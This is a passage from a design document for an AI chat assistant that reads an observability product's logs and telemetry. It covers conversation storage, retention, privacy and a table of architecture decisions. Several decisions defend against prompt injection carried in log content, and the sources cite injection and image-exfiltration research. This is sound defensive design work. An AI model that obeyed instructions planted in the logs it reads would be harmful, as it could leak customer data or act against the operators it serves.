Everything in foundation section 12 applies. In addition: "chat with your telemetry, unlike the others"; "it cannot be wrong because it cites"; "your logs stay on your server" for anyone using a cloud provider; "no way out"; "cheaper than X" until T4.3 gives measured tokens per question.

## 9. Storage and lifetime

- **`assistant_messages` stores the question, the validated answer, and the record of each tool step:** tool, arguments, time range, row count, and whether it was cut. **It does not store tool results.** Otherwise conversations become a second, longer-lived store of attacker text and personal data. A quote by reference therefore shows "no longer available" once its log ages out, which matches how a citation works.
- **What is sent per call** stays in `ai_runs` as field names (FD9). Prompts are not stored.
- **Conversation lifetime: the plan's derived retention** (Free 30 days in seed `0005_plans_table.py:34`; **later migrations not traced**). A stored finding must not outlive what it names, and the same reasoning applies. People may delete their own at any time.
- **Private to the person.** Admins see usage, not contents. `tables.py` treats them as children of `users`, like `sessions` (`organizations/tables.py:110`), so deleting a person deletes them. Whether "Delete my account" (`docs/features/personal-data/spec.md:105`) also needs a statement about this is for the specification.
- **Log erasure** (ADR-014) cannot reach words in a stored answer. Keeping quotes by reference narrows this and does not close it. The model's prose might paraphrase. Stated plainly, not solved.
- **pgvector on install:** ~~the migration must check `pg_extension` and stop.~~ **Superseded in review:** a stop there would stop `setup` and so alerts, so a `setup` step creates the extension, and failure means keyword search (spec D62). F3 confirmed the official image makes `POSTGRES_USER` a superuser.

## Decisions taken

*Recommended by the authors, founder may overrule.*

| # | Question | Options | Recommendation and why |
|---|---|---|---|
| D1 | How the model reads data | SQL / query language / fixed tools | **Fixed tools,** over existing GET routes. Keeps the tenant fence, limits and bounds |
| D2 | Free text in the loop | Single loop / Dual LLM / filter | **Single loop with structure first, built so a reader can replace a log tool.** Move on the suite's evidence |
| D3 | Ticket's reach | Person's whole reach / one project and an allow-list of routes | **One project and an allow-list.** A steered model reaches less. Cost: no cross-project answers |
| D4 | How the worker obtains the ticket | In job arguments / minted by the AI role / minted by the API and sealed | **API mints and seals.** The other two break the foundation's rules or widen the AI role's power |
| D5 | Ticket on findings | Read as a person / as a token | **As a token.** Names and written reasons should not go to a provider by default |
| D6 | Delivery to the browser | Word stream / live steps with checked answer | **Live steps by polling.** Streaming would show unchecked text |
| D7 | Chat's capacity | Share `insight` / own queue or reserved slots | **Separate,** since an incident is when both peak |
| D8 | Commands in answers | Allow / only by reference to a runbook | **Only by reference.** A person is a way out |
| D9 | Quotes | Model types them / by reference, filled by nexovue | **By reference.** The foundation's URL rule then holds and real answers still work |
| D10 | Numbers | Trust / match against results, and flag | **Match and flag first.** Rate of false flags is unknown, so it does not refuse yet |
| D11 | Separate consent for chat | Share F3's / own | **Own.** What is sent is materially larger |
| D12 | Names in chat | Alias / fence | **Fence.** Aliasing cannot be made complete where log bodies are read |
| D13 | Index | HNSW from day one / exact scan first | **Exact scan first.** Correct results, no memory cost. Add on measurement. pgvector still used, as decision 0004 says |
| D14 | Column size | Fixed / no fixed size, with model name | **No fixed size.** Each customer picks their own model |
| D15 | Provider with no embeddings | Refuse knowledge / keyword search and say so / require a second connection | **Keyword search, and say so.** A second optional embedding connection may be added later without a schema change |
| D16 | What is indexed | Everything / person-written and facts | **Person-written and facts.** No model words, no raw names |
| D17 | Stored conversation contents | With tool results / without | **Without.** Otherwise a second store of attacker text |
| D18 | Conversation lifetime | Forever / plan's derived retention | **Derived retention.** Same rule as findings |
| D19 | Who sees a conversation | Team / the person | **The person.** Sharing can come later |
| D20 | Runbook source first | Paste or upload / Git or wiki sync | **Paste or upload.** No connection or consent needed beyond chat's own |
| D21 | Service map in the surface | Keep out / add | **Add,** openly, as tokens gain it too. Chat is poor without it |
| D22 | Where it appears | Panel / page / ⌘K | **Side panel and a finding-page entry.** ⌘K stays with search |
| D23 | MCP first | Before chat / with chat | **Before chat.** The gap exists today, and U7 says F4 closes it first |
| D24 | `/llm/calls` as a chat tool | Yes / no | **No, in the first version.** It holds the customer's prompts, a second disclosure, and no starter question needs it |

## Founder decisions needed

**None new here.** Foundation items 1 (AI on hosted), 2 (selling line) and 4 (evaluation money) were approved by the founder on 2026-11-02, as recommended. Chat's own founder questions are in [`spec.md`](spec.md), *Founder decisions needed*.

## Not checked

- Anything running. No latency, token, recall or quality figure exists.
- Whether every console screen accepts an exact time range from the address.
- Elastic's exact licence tier for the Observability AI Agent (a paid self-managed subscription, most likely Enterprise; spec D82); OpenObserve's own assistant configuration, and its local-model conflict; Coroot's bring-your-own-model status; Seer Agent's price after beta and web availability; New Relic's chat, which searches did not surface.
- Whether a Bedrock API key works on `InvokeModel` for Titan embeddings (Converse is not the embedding route; spec D81). Ollama documents `/v1/embeddings`, not yet called. T6.0 makes one real call to each.
- Whether model-written placeholders hold up on a small local model.
- ~~Whether the shared Postgres account is a superuser on an install.~~ F3 answered: on the bundled image, yes.
- Whether a real on-call engineer wants any of this. No interviews exist.

## Sources

**In this repository:** [`phase-2-plan.md`](../../product/phase-2-plan.md), [`phase-2-foundation.md`](../../product/phase-2-foundation.md), [code map](../../research/phase-2-code-map-2026-11.md), [competitors](../../research/phase-2-competitors-2026-11.md), [customers](../../research/phase-2-customers-2026-11.md), [`team-and-api-access/spec.md`](../team-and-api-access/spec.md) (AC32 to AC35), [`feature-catalog.md`](../../product/feature-catalog.md), [`vision.md`](../../product/vision.md). LogJack, AIOpsDoom, Design Patterns and Rule of Two details not listed below come from the customers research.

**Read for this document, 2026-11-02:**

- [Grafana: Assistant self-managed](https://grafana.com/docs/grafana-cloud/machine-learning/assistant/self-managed.md), [Assistant usage limits](https://grafana.com/docs/grafana-cloud/machine-learning/assistant/pricing/), [Grafana pricing](https://grafana.com/pricing/)
- [Datadog: AI Credits](https://docs.datadoghq.com/account_management/billing/ai_credits.md), [Datadog pricing](https://www.datadoghq.com/pricing/?product=ai-credits)
- [SigNoz: AI overview](https://signoz.io/docs/ai/overview/)
- [Honeycomb: AI policies](https://docs.honeycomb.io/security-compliance/ai-policies.md)
- [Dynatrace Assist](https://docs.dynatrace.com/docs/shortlink/assist-conv)
- [Elastic AI Assistant](https://www.elastic.co/docs/solutions/observability/ai/observability-ai-assistant), [Elastic 8.19 page](https://www.elastic.co/guide/en/observability/8.19/obs-ai-assistant.html)
- [HolmesGPT](https://github.com/HolmesGPT/holmesgpt)
- [OpenObserve March 2026 update](https://openobserve.ai/blog/product-update-march-2026/), search summary only
- Read in review, 2026-11-02, through a summarizing tool, so check before quoting: [Sentry Seer Agent](https://sentry.io/about/press-releases/sentry-launches-seer-agent/), [SigNoz MCP server](https://signoz.io/docs/ai/signoz-mcp-server/), [Datadog Bits Chat](https://docs.datadoghq.com/bits_ai/bits_chat/), [Datadog AI Credits](https://docs.datadoghq.com/account_management/billing/ai_credits/), [Elastic Agent Builder limitations](https://www.elastic.co/docs/explore-analyze/ai-features/agent-builder/limitations-known-issues), [Coroot's model test](https://coroot.com/blog/hard-part-of-ai-root-cause-analysis-is-no-longer-the-model/)
- [pgvector README](https://github.com/pgvector/pgvector)
- [OWASP: LLM Prompt Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html)
- [LogJack](https://arxiv.org/html/2604.15368)
- [Embrace The Red: image exfiltration](https://embracethered.com/blog/posts/2023/anthropic-fixes-claude-data-exfiltration-via-images), search summary only
- [Anthropic: Embeddings](https://docs.anthropic.com/en/docs/build-with-claude/embeddings), [AWS: Titan Text Embeddings](https://docs.aws.amazon.com/bedrock/latest/userguide/titan-embedding-models.html), search summaries only
- Third-party figures, labelled where used: [OpenAI embedding price list](https://pricepertoken.com/embedding/model/openai-text-embedding-3-small), [nomic-embed-text](https://localaimaster.com/models/nomic-embed-text)
